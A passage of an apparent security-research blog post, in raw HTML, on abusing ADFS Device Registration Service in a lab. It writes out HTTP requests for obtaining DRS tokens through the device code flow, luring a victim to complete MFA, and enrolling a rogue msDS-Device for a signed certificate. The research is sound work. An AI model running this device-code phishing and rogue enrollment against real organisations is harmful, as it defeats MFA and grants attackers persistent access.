https://miro.medium.com/v2/resize:fit:1100/1*2_lO5Qj_1mT963P_OilkpA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*2_lO5Qj_1mT963P_OilkpA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="95" loading="lazy" role="presentation"/></picture></div></div></figure><p id="09e9" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This code is then exchanged for an access token using:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="95e8" class="pv nx gu nv b bg pw px l py pz">POST /adfs/oauth2/token HTTP/1.1<br/>Host: adfs.lab.local<br/>User-Agent: Windows NT 1<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 536<br/><br/>grant_type=authorization_code&amp;<br/>code=eNSvPCotu0yaI4ttVB1WXA.Dn...&amp;<br/>client_id=dd762716-544d-4aeb-a526-687b73838a22&amp;<br/>redirect_uri=ms-app%3A%2F%2Fwindows.immersivecontrolpanel%2F</span></pre><p id="874f" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">And hopefully, we get our Access Token back:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qs"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*g-QoOxsjpik5lhwXgOk6GA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*g-QoOxsjpik5lhwXgOk6GA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*g-QoOxsjpik5lhwXgOk6GA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*g-QoOxsjpik5lhwXgOk6GA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*g-QoOxsjpik5lhwXgOk6GA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*g-QoOxsjpik5lhwXgOk6GA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g-QoOxsjpik5lhwXgOk6GA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*g-QoOxsjpik5lhwXgOk6GA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*g-QoOxsjpik5lhwXgOk6GA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*g-QoOxsjpik5lhwXgOk6GA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*g-QoOxsjpik5lhwXgOk6GA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*g-QoOxsjpik5lhwXgOk6GA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*g-QoOxsjpik5lhwXgOk6GA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*g-QoOxsjpik5lhwXgOk6GA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="95" loading="lazy" role="presentation"/></picture></div></div></figure><p id="9a1c" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">One important caveat here however is that the DRS service has the following authentication policy assigned:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div class="pa pb qt"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*UaBn7fOvTXgYgDUBBliy0g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*UaBn7fOvTXgYgDUBBliy0g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*UaBn7fOvTXgYgDUBBliy0g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*UaBn7fOvTXgYgDUBBliy0g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*UaBn7fOvTXgYgDUBBliy0g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*UaBn7fOvTXgYgDUBBliy0g.png 1100w, https://miro.medium.com/v2/resize:fit:1344/format:webp/1*UaBn7fOvTXgYgDUBBliy0g.png 1344w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 672px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*UaBn7fOvTXgYgDUBBliy0g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*UaBn7fOvTXgYgDUBBliy0g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*UaBn7fOvTXgYgDUBBliy0g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*UaBn7fOvTXgYgDUBBliy0g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*UaBn7fOvTXgYgDUBBliy0g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*UaBn7fOvTXgYgDUBBliy0g.png 1100w, https://miro.medium.com/v2/resize:fit:1344/1*UaBn7fOvTXgYgDUBBliy0g.png 1344w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 672px"/><img alt="" class="bh mb pn c" width="672" height="755" loading="lazy" role="presentation"/></picture></div></figure><p id="20a2" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This means that MFA is required if we are authenticating as a user account to ADFS (or we can authenticate as a Computer Account and bypass this, but this isn’t so useful at the moment).</p><p id="ee53" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So what happens if we hit this ACL? Well during authentication, we’ll see the following error:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qu"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*3U4k4ihYE1T0OPKo22_LVQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*3U4k4ihYE1T0OPKo22_LVQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*3U4k4ihYE1T0OPKo22_LVQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*3U4k4ihYE1T0OPKo22_LVQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*3U4k4ihYE1T0OPKo22_LVQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*3U4k4ihYE1T0OPKo22_LVQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3U4k4ihYE1T0OPKo22_LVQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*3U4k4ihYE1T0OPKo22_LVQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*3U4k4ihYE1T0OPKo22_LVQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*3U4k4ihYE1T0OPKo22_LVQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*3U4k4ihYE1T0OPKo22_LVQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*3U4k4ihYE1T0OPKo22_LVQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*3U4k4ihYE1T0OPKo22_LVQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*3U4k4ihYE1T0OPKo22_LVQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="498" loading="lazy" role="presentation"/></picture></div></div></figure><p id="1845" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Unfortunately if this access control policy is in place, this stops us in our tracks of attempting to create a <code class="cx ns nt nu nv b">msDS-Device</code> using stolen credentials, unless…</p><h1 id="c412" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">DRS OAuth2 Client Support Device Code Flow</h1><p id="38b0" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">To be honest, the fact that the Device Code Flow even exists in ADFS was news to me, but it does. And it’s enabled for the DRS client by default. In fact it’s enabled for every OAuth2 client on ADFS by default, which should make things fun when assessing other OAuth2 integrations.</p><p id="e8ce" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So how does this work? Well to initiate this flow for DRS, you would first make a call to <code class="cx ns nt nu nv b">/adfs/oauth2/devicecode</code> with our client ID and resource:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="8de4" class="pv nx gu nv b bg pw px l py pz">POST /adfs/oauth2/devicecode HTTP/1.1<br/>Host: adfs.lab.local<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 103<br/><br/>client_id=dd762716-544d-4aeb-a526-687b73838a22&amp;<br/>resource=urn:ms-drs:434DF4A9-3CF2-4C1D-917E-2CD2B72F515A</span></pre><p id="6486" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This will return your usual OAuth2 device code information:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="2a5a" class="pv nx gu nv b bg pw px l py pz">HTTP/1.1 200 OK<br/>...<br/><br/>{<br/>&quot;device_code&quot;:&quot;8uODMKe4OEGu4[...]8fG640TTMxOQ&quot;,<br/>&quot;expires_in&quot;:899,<br/>&quot;interval&quot;:5,<br/>&quot;message&quot;:&quot;To sign in, use a web browser to open the page https:\\/\\/adfs.lab.local\\/adfs\\/oauth2\\/deviceauth and enter the code SYGTLXSGB to authenticate.&quot;,<br/>&quot;user_code&quot;:&quot;SYGTLXSGB&quot;,<br/>&quot;verification_uri&quot;:&quot;https:\\/\\/adfs.lab.local\\/adfs\\/oauth2\\/deviceauth&quot;,<br/>&quot;verification_uri_complete&quot;:&quot;https:\\/\\/adfs.lab.local\\/adfs\\/oauth2\\/deviceauth?user_code=SYGTLXSGB&amp;client-request-id=b08b3ca6-6a56-4cf3-1b00-0080000000e3&quot;,<br/>&quot;verification_url&quot;:&quot;https:\\/\\/adfs.lab.local\\/adfs\\/oauth2\\/deviceauth&quot;<br/>}</span></pre><p id="c172" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">You would then direct your victim to the URL indicated (you can also pre-fill the code with the <code class="cx ns nt nu nv b">user_code</code> parameter)</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="9751" class="pv nx gu nv b bg pw px l py pz">https://adfs.lab.local/adfs/oauth2/deviceauth?user_code=SYGTLXSGB</span></pre><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qa"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*31CEmkS9GO7ULoQSgVlnyg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*31CEmkS9GO7ULoQSgVlnyg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*31CEmkS9GO7ULoQSgVlnyg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*31CEmkS9GO7ULoQSgVlnyg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*31CEmkS9GO7ULoQSgVlnyg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*31CEmkS9GO7ULoQSgVlnyg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*31CEmkS9GO7ULoQSgVlnyg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*31CEmkS9GO7ULoQSgVlnyg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*31CEmkS9GO7ULoQSgVlnyg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*31CEmkS9GO7ULoQSgVlnyg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*31CEmkS9GO7ULoQSgVlnyg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*31CEmkS9GO7ULoQSgVlnyg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*31CEmkS9GO7ULoQSgVlnyg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*31CEmkS9GO7ULoQSgVlnyg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="502" loading="lazy" role="presentation"/></picture></div></div></figure><p id="b168" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">When the user authenticates (and hopefully completes the required MFA steps to validate the ACL above), you retrieve the <code class="cx ns nt nu nv b">access_token</code> by making the following call to <code class="cx ns nt nu nv b">/adfs/oauth2/token</code>:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="7c67" class="pv nx gu nv b bg pw px l py pz">POST /adfs/oauth2/token HTTP/1.1<br/>Host: adfs.lab.local<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 587<br/><br/>client_id=dd762716-544d-4aeb-a526-687b73838a22&amp;<br/>device_code=8uODMKe4OEGu4Ku[...]cqx5rXGQ8MbNPM6J5iQ&amp;<br/>grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Adevice_code&amp;<br/>resource=urn:ms-drs:434DF4A9-3CF2-4C1D-917E-2CD2B72F515A</span></pre><p id="428b" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">And with the <code class="cx ns nt nu nv b">access_token</code> returned (and a <code class="cx ns nt nu nv b">refresh_token</code> which we will need later), we have a authentication token scoped to the DRS service.</p><p id="d0fa" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So once we have an Access Token, how do we turn this into a device registration?</p><h1 id="9f0c" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">DeviceEnrollmentWebService.svc</h1><p id="8655" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">You may have seen earlier that <code class="cx ns nt nu nv b">DeviceEnrollmentWebService.svc</code> was in the XML from the <code class="cx ns nt nu nv b">/EnrollmentServer/contract</code> endpoint:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qv"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*osG6mcoM8kKyHpfUKACb-g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*osG6mcoM8kKyHpfUKACb-g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*osG6mcoM8kKyHpfUKACb-g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*osG6mcoM8kKyHpfUKACb-g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*osG6mcoM8kKyHpfUKACb-g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*osG6mcoM8kKyHpfUKACb-g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*osG6mcoM8kKyHpfUKACb-g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*osG6mcoM8kKyHpfUKACb-g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*osG6mcoM8kKyHpfUKACb-g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*osG6mcoM8kKyHpfUKACb-g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*osG6mcoM8kKyHpfUKACb-g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*osG6mcoM8kKyHpfUKACb-g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*osG6mcoM8kKyHpfUKACb-g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*osG6mcoM8kKyHpfUKACb-g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="189" loading="lazy" role="presentation"/></picture></div></div></figure><p id="bbe7" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This web service can be used along with an Access Token for the <code class="cx ns nt nu nv b">urn:ms-drs:434DF4A9-3CF2-4C1D-917E-2CD2B72F515A</code> resource to register a new <code class="cx ns nt nu nv b">msDS-Device</code> resource.</p><p id="ebcb" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The format of the SOAP request that we use to register a device using this endpoint is:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="7cc6" class="pv nx gu nv b bg pw px l py pz">POST https://adfs.lab.local/EnrollmentServer/DeviceEnrollmentWebService.svc HTTP/1.1<br/>Content-Type: application/soap+xml; charset=utf-8<br/>...<br/><br/>&lt;s:Envelope xmlns:s=&quot;http://www.w3.org/2003/05/soap-envelope&quot; xmlns:a=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:u=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd&quot; xmlns:wsse=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&quot; xmlns:wst=&quot;http://docs.oasis-open.org/ws-sx/ws-trust/200512&quot; xmlns:ac=&quot;http://schemas.xmlsoap.org/ws/2006/12/authorization&quot;&gt;<br/> &lt;s:Header&gt;<br/>  &lt;a:Action s:mustUnderstand=&quot;1&quot;&gt;http://schemas.microsoft.com/windows/pki/2009/01/enrollment/RST/wstep&lt;/a:Action&gt;<br/>  &lt;a:MessageID&gt;urn:uuid:0d5a1441-5891-453b-becf-a2e5f6ea3749&lt;/a:MessageID&gt;<br/>  &lt;a:ReplyTo&gt;<br/>   &lt;a:Address&gt;http://www.w3.org/2005/08/addressing/anonymous&lt;/a:Address&gt;<br/>  &lt;/a:ReplyTo&gt;<br/>  &lt;a:To s:mustUnderstand=&quot;1&quot;&gt;https://adfs.lab.local/EnrollmentServer/DeviceEnrollmentWebService.svc&lt;/a:To&gt;<br/>  &lt;wsse:Security s:mustUnderstand=&quot;1&quot;&gt;<br/>   &lt;wsse:BinarySecurityToken ValueType=&quot;urn:ietf:params:oauth:token-type:jwt&quot; EncodingType=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary&quot;&gt;ZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2Np[...]BoX3Jyck1xWjZNQQ==&lt;/wsse:BinarySecurityToken&gt;<br/>  &lt;/wsse:Security&gt;<br/> &lt;/s:Header&gt;<br/> &lt;s:Body&gt;<br/>  &lt;wst:RequestSecurityToken&gt;<br/>   &lt;wst:TokenType&gt;http://schemas.microsoft.com/5.0.0.0/ConfigurationManager/Enrollment/DeviceEnrollmentToken&lt;/wst:TokenType&gt;<br/>   &lt;wst:RequestType&gt;http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue&lt;/wst:RequestType&gt;<br/>   &lt;wsse:BinarySecurityToken ValueType=&quot;http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10&quot; EncodingType=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd#base64binary&quot;&gt;MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEz[...]MXIJ7lClxV7&lt;/wsse:BinarySecurityToken&gt;<br/>   &lt;ac:AdditionalContext xmlns=&quot;http://schemas.xmlsoap.org/ws/2006/12/authorization&quot;&gt;<br/>    &lt;ac:ContextItem Name=&quot;DeviceType&quot;&gt;<br/>     &lt;ac:Value&gt;Windows&lt;/ac:Value&gt;<br/>    &lt;/ac:ContextItem&gt;<br/>    &lt;ac:ContextItem Name=&quot;ApplicationVersion&quot;&gt;<br/>     &lt;ac:Value&gt;6.3.9600.0&lt;/ac:Value&gt;<br/>    &lt;/ac:ContextItem&gt;<br/>    &lt;ac:ContextItem Name=&quot;DeviceDisplayName&quot;&gt;<br/>     &lt;ac:Value&gt;testlabwin8&lt;/ac:Value&gt;<br/>    &lt;/ac:ContextItem&gt;<br/>   &lt;/ac:AdditionalContext&gt;<br/>  &lt;/wst:RequestSecurityToken&gt;<br/> &lt;/s:Body&gt;<br/>&lt;/s:Envelope&gt;</span></pre><p id="b2a3" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The important fields here are:</p><ul class=""><li id="2836" class="mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr qg qh qi bk">Header <code class="cx ns nt nu nv b">BinarySecurityToken</code> - This is the base64 encoded <code class="cx ns nt nu nv b">access_token</code> we retrieved during authentication</li><li id="ba1e" class="mu mv gu mw b mx qj mz na nb qk nd ne nf ql nh ni nj qm nl nm nn qn np nq nr qg qh qi bk">Body <code class="cx ns nt nu nv b">BinarySecurityToken</code> - PKCS#10 encoded CSR generated by us for signing</li></ul><p id="d53c" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">When we make this request, we receive a response with a signed certificate:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="ce5c" class="pv nx gu nv b bg pw px l py pz">HTTP/1.1 200 OK<br/>Content-Length: 3866<br/>Content-Type: application/soap+xml; charset=utf-8<br/>Server: Microsoft-HTTPAPI/2.0<br/>Strict-Transport-Security: max-age=31536000; includeSubDomains<br/>Date: Sat, 14 Dec 2024 21:29:05 GMT<br/><br/>&lt;s:Envelope xmlns:s=&quot;http://www.w3.org/2003/05/soap-envelope&quot; xmlns:a=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;&lt;s:Header&gt;&lt;a:Action s:mustUnderstand=&quot;1&quot;&gt;http://schemas.microsoft.com/windows/pki/2009/01/enrollment/RSTRC/wstep&lt;/a:Action&gt;&lt;a:RelatesTo&gt;urn:uuid:0d5a1441-5891-453b-becf-a2e5f6ea3749&lt;/a:RelatesTo&gt;&lt;/s:Header&gt;&lt;s:Body&gt;&lt;RequestSecurityTokenResponseCollection xmlns=&quot;http://docs.oasis-open.org/ws-sx/ws-trust/200512&quot;&gt;&lt;RequestSecurityTokenResponse&gt;&lt;TokenType&gt;http://schemas.microsoft.com/5.0.0.0/ConfigurationManager/Enrollment/DeviceEnrollmentToken&lt;/TokenType&gt;&lt;RequestedSecurityToken&gt;&lt;BinarySecurityToken ValueType=&quot;http://schemas.microsoft.com/5.0.0.0/ConfigurationManager/Enrollment/DeviceEnrollmentProvisionDoc&quot; EncodingType=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd#base64binary&quot; xmlns=&quot;http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd&quot;&gt;PHdhcC1wcm92aXNpb25pbmdkb2MgdmVyc2lvbj0iMS4xIj4NCiAgPGNoYXJhY3RlcmlzdGljIHR5&amp;#xD;<br/>cGU9IkNlcnRpZmljYXRlU3RvcmUiPg0KICAgIDxjaGFyYWN0ZXJpc3RpYyB0eXBlPSJNeSI+DQog&amp;#xD;<br/>[...]<br/>OERmUSswS25ENjY3aTZvWlk0RTY3eGhCYVA3dG1Sb24xR0xucENYQzBzeGoiIC8+DQogICAgICAg&amp;#xD;<br/>IDwvY2hhcmFjdGVyaXN0aWM+DQogICAgICA8L2NoYXJhY3RlcmlzdGljPg0KICAgIDwvY2hhcmFj&amp;#xD;<br/>dGVyaXN0aWM+DQogIDwvY2hhcmFjdGVyaXN0aWM+DQo8L3dhcC1wcm92aXNpb25pbmdkb2M+&lt;/BinarySecurityToken&gt;&lt;/RequestedSecurityToken&gt;&lt;RequestID xmlns=&quot;http://schemas.microsoft.com/windows/pki/2009/01/enrollment&quot;&gt;0&lt;/RequestID&gt;&lt;AdditionalContext 